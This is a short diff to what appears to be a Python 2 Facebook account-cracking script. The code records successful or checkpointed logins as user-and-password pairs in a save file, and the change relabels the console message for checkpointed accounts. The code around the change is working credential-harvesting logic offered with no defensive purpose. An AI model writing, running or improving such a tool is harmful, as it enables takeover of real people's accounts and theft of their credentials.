@@ -252,7 +252,7 @@ def action():
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[RIMON-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[ID OPEN ON 07 DAYS]\x1b[0m \n'
+                print '\x1b[1;96m[RIMON-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[JUST NOW LOGIN]\x1b[0m \n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
